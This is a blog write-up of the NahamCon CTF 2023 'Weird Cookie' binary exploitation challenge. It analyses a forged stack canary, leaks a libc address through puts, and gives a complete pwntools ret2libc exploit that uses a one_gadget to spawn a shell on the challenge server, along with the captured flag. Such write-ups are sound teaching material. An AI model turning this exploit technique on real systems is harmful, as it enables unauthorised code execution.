---
title: NahamCon CTF 2023 - Weird Cookie
date: 2023-06-21 09:00:00 +0800
categories: [NahamCon CTF 2023, Binary Exploitation]
tags: [binary-exploitation, pwn, buffer-overflow, gdb]
media_subpath: /assets/img/ctfs/nahamcon2023/weird-cookie/
image:
  path: weird-cookie.jpeg
---

## Info

| Name                                                                               | Difficulty   | Author        |
|------------------------------------------------------------------------------------|--------------|:--------------|
| [Weird Cookie](https://github.com/v3he/ctfs/tree/master/nahamcon2023/weird-cookie) | Medium       | @M_alpha#3534 |

> Something's a little off about this stack cookie...
{: .prompt-info }

## Analysis

For this challenge we are provided with two files:

- `weird_cookie` is the application that we have to breach
- `libc-2.27.so` is the exact version of libc that the host is using

We will start by looking at the security of the binary, for this we will make use of `checksec`, which you can download directly or use it if you have [pwntools](https://github.com/Gallopsled/pwntools) installed.

```bash
$ pwn checksec weird_cookie
[*] '/home/kali/ctf/nahamcon2023/weird-cookie/weird_cookie'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
```
{: .nolineno }

The main thing about the above information is the `NX` entry. NX stands for No eXecute. This is a security feature used by the operating system to prevent certain areas of memory from being executed. When NX is enabled, it means the stack memory is non-executable, which can help to prevent the execution of injected shellcode during a buffer overflow attack.

`ASLR (Address Space Layout Randomization)` is also enabled, so it looks like we have to do some kind of `ret2libc` technique to get remote execution on the machine.

> A ret2libc (return to libc, or return to the C library) attack is one in which the attacker does not require any shellcode to take control of a target, vulnerable process.
{: .prompt-info }

## Adjusting the Binary

As we know that the binary uses the libc version that is provided with the challenge, what we are going to do first is to adjust the binary to use this libc version instead of the one that our machine has, this way, at the time of the exploitation and debugging we will have the correct offsets since they will be the same as the version that runs on the server. We are currently using `/lib/x86_64-linux-gnu/libc.so.6`

```bash
$ ldd weird_cookie 
        linux-vdso.so.1 (0x00007fff1b1f1000)
        libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fd67e826000)
        /lib64/ld-linux-x86-64.so.2 (0x00007fd67ea2a000)
```
{: .nolineno }

We are going to make use of [pwninit](https://github.com/io12/pwninit), a very useful tool that will give us all the base we need to start the exploit, all we have to do is download it and have in the current folder the binary and the libc file.

```bash
$ pwninit                  
bin: ./weird_cookie
libc: ./libc-2.27.so

fetching linker
https://launchpad.net/ubuntu/+archive/primary/+files//libc6_2.27-3ubuntu1.6_amd64.deb
unstripping libc
https://launchpad.net/ubuntu/+archive/primary/+files//libc6-dbg_2.27-3ubuntu1.6_amd64.deb
warning: failed unstripping libc: failed running eu-unstrip, please install elfutils: No such file or directory (os error 2)
setting ./ld-2.27.so executable
symlinking ./libc.so.6 -> libc-2.27.so
copying ./weird_cookie to ./weird_cookie_patched
running patchelf on ./weird_cookie_patched
writing solve.py stub
                                                                                                                                                                  
$ ls -l
total 2208
-rwxr-xr-x 1 kali kali  179152 Jun 21 10:07 ld-2.27.so
-rwxr-xr-x 1 kali kali 2030928 Jun 21 10:06 libc-2.27.so
lrwxrwxrwx 1 kali kali      12 Jun 21 10:07 libc.so.6 -> libc-2.27.so
-rwxr-xr-x 1 kali kali     443 Jun 21 10:07 solve.py
-rwxr-xr-x 1 kali kali   17000 Jun 21 10:06 weird_cookie
-rwxr-xr-x 1 kali kali   21616 Jun 21 10:07 weird_cookie_patched
```
{: .nolineno }

We see that a lot of files have been created. Our new target binary is `weird_cookie_patched`, which is the version that has been adjusted to use libc 2.27, as we can see if we now run the `ldd` command again.

```bash
$ ldd weird_cookie_patched
        linux-vdso.so.1 (0x00007fff1ecb5000)
        libc.so.6 => ./libc.so.6 (0x00007f63b5000000)
        ./ld-2.27.so => /lib64/ld-linux-x86-64.so.2 (0x00007f63b5420000)
```
{: .nolineno }

## Execution

Now that we have the binary to work with, let's run it and see what it does.

```bash
$ ./weird_cookie_patched 
Do you think you can overflow me?
im sure
im sure

Are you sure you overflowed it right? Try again.
share the blog
```
{: .nolineno }

It seems quite simple, it asks for a text input and then returns it to the screen, asks again for another text input and that's the end of the execution.
Let's see what happens if we try to send `100 characters` in the input requests.

```bash
$ ./weird_cookie_patched
Do you think you can overflow me?
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Are you sure you overflowed it right? Try again.
Nope. :(
```
{: .nolineno }

Well, it seems that he didn't like it, this time when sending the input he sent me back a lower amount than the one I sent him, besides he didn't ask for input again, just automatically put `Nope. :(` and close.

```bash
$ echo -n AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA | wc -c                         
64
```
{: .nolineno }

Returned exactly 64 characters, which is probably the buffer size.

## Disassembly With IDA

Now that we have an idea of what the program does, it is time to analyze it statically to see in more depth what it is doing.

In my case I am going to use [IDA Free](https://hex-rays.com/ida-free/) but you can use any other like [Ghidra](https://github.com/NationalSecurityAgency/ghidra), [Binary Ninja](https://binary.ninja/) etc. The free version of `IDA` does not allow to see the decompiled code, so maybe with `Ghidra` you would see it easier.

Let's take a quick look from the top and then I'll go deeper into each part.

![IDA Graph Main Function](weird-cookie-ida-graph.png)

It is not very long, but let's go little by little, I will put comments along the code so you can see better what is happening.

### Canary Creation

```bash
mov     rax, cs:printf_ptr          # address of printf
mov     rdx, rax
mov     rax, 123456789ABCDEF1h      # hardcoded value
xor     rax, rdx                    # xor the hardcoded value with the address of printf
mov     [rbp+var_8], rax            # save the result in a variable
mov     rax, [rbp+var_8]
mov     cs:saved_canary, rax        # save the result in saved_canary
```
{: .nolineno }

> Stack Canaries are very simple - at the beginning of the function, a random value is placed on the stack. Before the program executes `ret`, the current value of that variable is compared to the initial: if they are the same, no buffer overflow has occurred.
{: .prompt-info }

It seems that some kind of protection is being implemented imitating what would be a `canary`, for this it uses a hardcoded string xored with the printf address to generate a string that we will see below is used to validate the integrity of the binary.

### First Input

```bash
lea     rax, [rbp+s]                 # [rbp+s] is the buffer where our input is going to be stored
mov     edx, 28h ; '('  ; n          # 28h is 40 in decimal
mov     esi, 0          ; c
mov     rdi, rax        ; s
call    _memset                      # clears the first 40 characters of our buffer
lea     rdi, s          ; "Do you think you can overflow me?"
call    _puts                        # prints the string above to the user
lea     rax, [rbp+s]                 # [rbp+s] is the buffer where our input is going to be stored
mov     edx, 40h ; '@'  ; nbytes     # 40h is 64 in decimal
mov     rsi, rax        ; buf
mov     edi, 0          ; fd
call    _read                        # stores 64 bytes of our input into the buffer
lea     rax, [rbp+s]
mov     rdi, rax        ; s
call    _puts                        # prints our input again to the console
```
{: .nolineno }

It is clearly seen that originally `40 characters` are cleared in the buffer but then when the user input is requested, `60` are stored! It looks like an `buffer overlow` but very limited in size.

I'm going to give you a little sneak peak of what we'll see later when we debug the program. This is what the memory looks like when we enter `40` characters as input.

![First Input Stack](first-input-stack.png)

### Second Input

```bash
lea     rax, [rbp+s]                 # [rbp+s] is the buffer where our input is going to be stored
mov     edx, 28h ; '('  ; n
mov     esi, 0          ; c
mov     rdi, rax        ; s
call    _memset                      # clears the first 40 characters of our buffer
lea     rdi, aAreYouSureYouO ; "Are you sure you overflowed it right? T"...
call    _puts                        # prints the string above to the user
lea     rax, [rbp+s]                 # [rbp+s] is the buffer where our input is going to be stored
mov     edx, 40h ; '@'  ; nbytes
mov     rsi, rax        ; buf
mov     edi, 0          ; fd
call    _read                        # stores 64 bytes of our input into the buffer
```
{: .nolineno }

Once again, it clears the first `40 bytes` of the buffer, displays a message to the user, and copies the first `64 bytes` of the input back into the buffer again.

### Canary Validation

![Canary Check](canary-check.png)

The integrity of the canary, saved in both `[rbp+var_8]` and `saved_canary` is checked by doing a `cmp`. In case the check failed, it displays the `Nope :(` message and exits. In case the check is successful it continues along the right path and reaches the `ret` instruction to continue with the normal exit of the program.

## Debugging

In the same way that in the disassembly, I am going to go part by part showing how each fragment of the program is seen from the debug mode, to see how data is saved in the memory. I'm going to use `IDA's own debugger`, but you can use `gdb` if you feel more comfortable.

### Canary Creation

```bash
mov     rax, cs:printf_ptr
mov     rdx, rax
mov     rax, 123456789ABCDEF1h
xor     rax, rdx
mov     [rbp+var_8], rax
mov     rax, [rbp+var_8]
mov     cs:saved_canary, rax
lea     rax, [rbp+s]                # <-- set a breakpoint here
```
{: .nolineno }

Let's set a `breakpoint` just after the creation of the canary to see where it is being saved and how the stack looks like at that moment.

![Canary Breakpoint](canary-bp.png)
![Canary Breakpoint Stack](canary-bp-stack.png)

### First Input

```bash
lea     rax, [rbp+s]
mov     edx, 28h ; '('  ; n
mov     esi, 0          ; c
mov     rdi, rax        ; s
call    _memset
lea     rdi, s          ; "Do you think you can overflow me?"
call    _puts
lea     rax, [rbp+s]
mov     edx, 40h ; '@'  ; nbytes
mov     rsi, rax        ; buf
mov     edi, 0          ; fd
call    _read
lea     rax, [rbp+s]
mov     rdi, rax        ; s
call    _puts
lea     rax, [rbp+s]                 # <-- set a breakpoint here
```
{: .nolineno }

Let's put another breakpoint just after our input is displayed on the screen. This time I will send only 20 characters.

![First Input Breakpoint](first-input-bp.png)
![First Input Breakpoint Stack](first-input-bp-stack.png)

Several interesting things can be seen in the image of the current stack, let's go one by one:

- at the end of our input we can see that a `line break` `\n` has also been added, so that we are not only sending `20` characters, but `21`, we need to take that in count.
- the input buffer is in a contiguous memory area than the canary, and remember that as we said when disassembling, we can write `64 bytes`, SO WE CAN OVERWRITE THE CANARY!

Another thing to keep in mind is that the application returns the same input that we have given it using the `puts` function. Given the address of the buffer, puts displays the contents until it encounters a null terminator `\0` (`00` in the hex view) which means that the string has finished.

So if in our case we fill the entire buffer just up to where the canary starts (40 bytes), the null terminator will not exist, so we can see an anomalous operation in the expected execution. Let me show you what I am trying to say, let's run the program again sending `39 characters`, not `40`, because when we press enter we send the line break which counts as a character.

```bash
$ ./weird_cookie_patched
Do you think you can overflow me?
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
����1)4���*V
Are you sure you overflowed it right? Try again.
haha
```
{: .nolineno }

What are those weird characters? It's a memory leak! We have extracted continuous memory from the buffer until the next null terminator, in this case it is:

- value of the canary
- `__libc_csu_init` 
- `__libc_start_main` from `libc_2.27.so`

I will explain more in the exploitation section, for now just keep in mind that we can leak the memory contiguous to the input.

### Second Input

There is not much to see here, basically it is like the first input, it saves 64 bytes in the input buffer.
We continue where we stopped at the previous breakpoint and put 20 "A" again in the second input request.

### Canary Validation

```bash
mov     rax, cs:saved_canary
cmp     [rbp+var_8], rax            # <-- set a breakpoint here
jz      short loc_55B0597B227F

loc_55B0597B227F:
    mov     eax, 0
    leave
    retn                            # <-- set a breakpoint here
```
{: .nolineno }

We are going to put a breakpoint just at the moment of doing the canary check and just before the program ends, in the `ret` instruction.

![Canary Validation Registers](cmp-reg.png)
![Canary Validation Stack](cmp-stack.png)

Since with `20 characters` we do not overwrite the canary, the comparison is done correctly, since both the stored canary (`rax`) and the canary buffer (`[rbp+var_8]`) have the same value.

Let's continue to the ret breakpoint.

![Canary Validation Registers](ret-reg.png)
![Canary Validation Stack](ret-stack.png)

> the `rip` (Instruction Pointer Register in x86_64) value after the `ret` instruction is executed will be the value at the top of the stack, pointed by `rsp` (Stack Pointer Register)
{: .prompt-info }

The return address can also be overwritten, so if we take the program to the final execution, we can control rip and redirect the execution where we want.

## Attack Plan

Let's recap with all the information we have:

1. in the first input we enter just enough bytes to eliminate the terminator nullbyte to be able to leak the contents of the memory that is in contiguous memory regions
2. in the second input we send junk the first 40 bytes until we reach the position of the canary, we set the canary (either by leak or by re-crafting it), another 8 bytes of junk and finally the memory address where we want to redirect the execution of the program.

Since the `ASLR` is enabled and in each execution the addresses change, the most important thing is to leak the address that we have seen before that contained `__libc_start_main`, since it is a `libc` function, so if we leak it out, we can calculate the `base address` of libc.

You can take a closer look at what a ret2libc attack is in this post: [Return-to-libc / ret2libc](https://www.ired.team/offensive-security/code-injection-process-injection/binary-exploitation/return-to-libc-ret2libc)

## Exploit

### Setup

When we used `pwninit` to adjust the binary, a file called `solve.py` should have been created too, you could use it as the base for the exploit. I will start from a blank python script so you can see the full process.

Let's start by creating a file called `exploit.py` with the following content:

```python
#!/usr/bin/env python3

from pwn import *

exe = ELF("./weird_cookie_patched", checksec=False)
libc = ELF("./libc-2.27.so", checksec=False)

p = process([exe.path])
```

- `exe = ELF("./weird_cookie_patched")`: This line is creating an ELF object that represents the binary file `weird_cookie_patched`. The ELF class in pwntools provides a lot of useful methods for analyzing and manipulating ELF files. This object will give you access to information about the binary file, like its headers, sections, symbols, etc.

- `libc = ELF("./libc-2.27.so")`: This line is creating another ELF object, this time for the libc-2.27.so file. This file is a shared library (the standard C library for Unix-like systems), and this object will give you access to the functions and other symbols in the library.

- `p = process([exe.path])`: This line is starting a new process running the `weird_cookie_patched` binary, and creating a Process object that represents this process. This object allows you to interact with the process: you can send it input, receive its output, attach a debugger to it, etc.

Now that we have the skeleton of the exploit, let's start interacting with it.

### Leak Address

```python
[.. code above..]

p.recvuntil(b"Do you think you can overflow me?")
p.sendline(b"A" * 55)     # 56 chars - 1 for new line

print(p.recvline())
print(p.recvline())
print(p.recvline())
```

First we wait until the program asks for input. Then we send `56 characters` (55 + 1 of the line break), just to get to the position where the address of `__libc_start_main` is stored.

You may wonder why I have not made a leak of the canary. Basically because we don't need it, since it is composed by a hardcoded variable xored with the printf address, we can always create it when we need it, since we have both.

After sending the input, we receive three lines, in a second you will see why. We run the above exploit using `python3 exploit.py`.

```bash
$ python exploit.py                              
[+] Starting local process '/home/kali/ctf/nahamcon2023/weird-cookie/weird_cookie_patched': pid 274218
b'\n'
b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\n'
b'\x87\x1cbp8\x7f\n'
[*] Stopped process '/home/kali/ctf/nahamcon2023/weird-cookie/weird_cookie_patched' (pid 274218)
```
{: .nolineno }

We can ignore the result of the first two `recvline()` since it only shows our input, what we want is the third output, which is the one with the address of `__libc_start_main`.
Well, it is not exactly `__libc_start_main`, you have to add the padding that IDA has shown us before, which can be seen here:

```bash
00007FFF481E6B48  00007FAD97021C87  libc_2.27.so:__libc_start_main+E7
```
{: .nolineno }

Okay, to continue where we left off, we need to collect the address that you see in the output and pass it to a format that we can work with:

```python
[.. code above..]

p.recvline()
p.recvline()

leak = u64(p.recv(6).ljust(8, b"\x00"))
info("Leaked address :: " + hex(leak))
```

We remove the unnecessary prints, read the output with the address and adjust it to the size of a 64bit address. If we re-launch the exploit:

```bash
$ python exploit.py
[+] Starting local process '/home/kali/ctf/nahamcon2023/weird-cookie/weird_cookie_patched': pid 279878
[*] Leaked address :: 0x7f62d9e21c87
[*] Stopped process '/home/kali/ctf/nahamcon2023/weird-cookie/weird_cookie_patched' (pid 279878)
```
{: .nolineno }

Perfect! We now have the address in a format we can work with.

### Calculate LIBC base

The next step is to calculate the libc base, for this, we have to do the following formula: `libc_base = leak - __libc_start_main offset - 0xE7`

```python
[.. code above..]

libc_base = leak - libc.symbols.__libc_start_main - 0xE7
info("LIBC base :: " + hex(libc_base))

p.recvuntil(b"Are you sure you overflowed it right? Try again.")
```

Once calculated, we prepare to send the next input, for which we wait one more time until we are asked to do so.

### Set the canary back

If we remember from the planning, what we have to do is to put `40 bytes` of junk, the `canary`, `8 bytes` of junk and `8 bytes` with the new address that will overwrite rip.

```python
[.. code above..]

payload = b"A" * 40
payload += p64(0x123456789ABCDEF1 ^ (libc_base + libc.symbols.printf))
payload += b"A" * 8
payload += b"B" * 8       # this will take control of rip

p.sendline(payload)

print(p.recv())
print(p.recv())
```

We calculate the canary as the program does and put it in the correct format. For the moment I have changed by `B's` the part that overwrites `rip`, since we still have to see what we do in this part.
If we run it again, we should see something like the following:

```bash
$ python exploit.py
[+] Starting local process '/home/kali/ctf/nahamcon2023/weird-cookie/weird_cookie_patched': pid 288253
[*] LIBC base :: 0x7f5f23800000
b'\n'
Traceback (most recent call last):
  File "/home/kali/ctf/nahamcon2023/weird-cookie/exploit.py", line 30, in <module>
    print(p.recv())
          ^^^^^^^^
  File "/home/kali/.local/lib/python3.11/site-packages/pwnlib/tubes/tube.py", line 105, in recv
    return self._recv(numb, timeout) or b''
           ^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/home/kali/.local/lib/python3.11/site-packages/pwnlib/tubes/tube.py", line 175, in _recv
    if not self.buffer and not self._fillbuffer(timeout):
                               ^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/home/kali/.local/lib/python3.11/site-packages/pwnlib/tubes/tube.py", line 154, in _fillbuffer
    data = self.recv_raw(self.buffer.get_fill_size())
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/home/kali/.local/lib/python3.11/site-packages/pwnlib/tubes/process.py", line 688, in recv_raw
    raise EOFError
EOFError
[*] Process '/home/kali/ctf/nahamcon2023/weird-cookie/weird_cookie_patched' stopped with exit code -11 (SIGSEGV) (pid 288253)
```
{: .nolineno }

We can see the exit status being `SIGSEGV`, this occurs because `0xBBBBBBBBBBBB` is not a valid address, and the application crashes.
We now know that it has been executed correctly and that we have overwritten `rip`, the program dont know how to continue so it crashed.

The first thing is to decide what we want the program to do now, the normal thing is to look for gadgets that allow us to call `system("/bin/sh")`, I leave you the link to another post of my blog where you can see it: [HackTheBox - Retired](https://v3he.io/posts/hackthebox-retired/#shell-as-www-data)

### Searching the gadget

In this case we are going to automate even more and we are going to use [one_gadget](https://github.com/david942j/one_gadget). Directly with a single gadget and without having to chain, we are going to get to the same point, execute a `/bin/sh` on the remote machine.

```bash
$ one_gadget libc-2.27.so
0x4f2a5 execve("/bin/sh", rsp+0x40, environ)
constraints:
  rsp & 0xf == 0
  rcx == NULL

0x4f302 execve("/bin/sh", rsp+0x40, environ)
constraints:
  [rsp+0x40] == NULL

0x10a2fc execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
```
{: .nolineno }

We have found three possible candidates, each one has its conditions, so it is a question of testing them or adjusting them to fit, since for example the second one has as a constraint that `rsp+0x40 is NULL`, normally we control the buffer and if it points to it, we can make this condition be fulfilled, although in this case it will not be necessary. I will try with the third one.

### RCE

```python
[.. code above..]

payload = b"A" * 40
payload += p64(0x123456789ABCDEF1 ^ (libc_base + libc.symbols.printf))
payload += b"A" * 8
payload += p64(libc_base + 0x10a2fc)      # our gadget

p.sendline(payload)

p.interactive()
```

```bash
$ python exploit.py 
[+] Starting local process '/home/kali/ctf/nahamcon2023/weird-cookie/weird_cookie_patched': pid 297525
[*] LIBC base :: 0x7fa5fca00000
[*] Switching to interactive mode

$ id
uid=1000(kali) gid=1000(kali) groups=1000(kali),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),100(users),106(netdev),111(bluetooth),114(scanner),137(wireshark),140(kaboxer),993(docker)
```
{: .nolineno }

Perfect! our payload has been executed successfully and thanks to `interactive()`, as its own name indicates, it changes us to interactive mode since we have successfully executed the shell.

```python
[.. code above..]

payload = b"A" * 40
payload += p64(0x123456789ABCDEF1 ^ (libc_base + libc.symbols.printf))
payload += b"A" * 8
payload += p64(libc_base + 0x10a2fc)      # our gadget

p.sendline(payload)

p.interactive()
```

Change the `process` line to `remote` with the address of the remote challenge and dump the flag!

```python
#p = process([exe.path])
p = remote('challenge.nahamcon.com', 31362)
```

```bash
$ python exploit.py
[+] Opening connection to challenge.nahamcon.com on port 31362: Done
[*] LIBC base :: 0x7f1fd719b000
[*] Switching to interactive mode

$ cat /flag.txt
flag{e87923d7cd36a8580d0cf78656d457c6}
```
{: .nolineno }

### Complete Exploit Source

```python
#!/usr/bin/env python3

from pwn import *

exe = ELF("./weird_cookie_patched", checksec=False)
libc = ELF("./libc-2.27.so", checksec=False)

p = process([exe.path])

p.recvuntil(b"Do you think you can overflow me?")
p.sendline(b"A" * 55)                                                     # padding until __libc_start_main address

p.recvline()
p.recvline()

leak = u64(p.recv(6).ljust(8, b"\x00"))
libc_base = leak - libc.symbols.__libc_start_main - 0xE7

p.recvuntil(b"Are you sure you overflowed it right? Try again.")

payload = b"A" * 40                                                       # padding until canary position
payload += p64(0x123456789ABCDEF1 ^ (libc_base + libc.symbols.printf))    # canary calculation
payload += b"A" * 8                                                       # padding until rip overwrite
payload += p64(libc_base + 0x10a2fc)                                      # gadget execve("/bin/sh")

p.sendline(payload)

p.interactive()
```

## Bonus Content

This is what it looks like if we open the binary with ghidra and see the decompiled code.

![Ghidra Code](ghidra.png)
